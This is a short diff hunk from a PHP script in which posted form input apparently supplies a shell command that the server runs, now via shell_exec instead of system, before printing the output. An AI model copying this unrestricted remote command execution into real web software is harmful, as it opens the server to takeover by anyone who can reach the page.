@@ -174,7 +174,7 @@ if (count($_POST)>0) {
 	if (strlen($shellcmd) > 0) {
 		echo "<b>shell command:</b>\n";
 		echo "<!--\n";
-		$shell_result = system($shellcmd);
+		$shell_result = shell_exec($shellcmd);
 		echo "-->\n";
 		echo "<pre>\n";
 		echo htmlentities($shell_result);
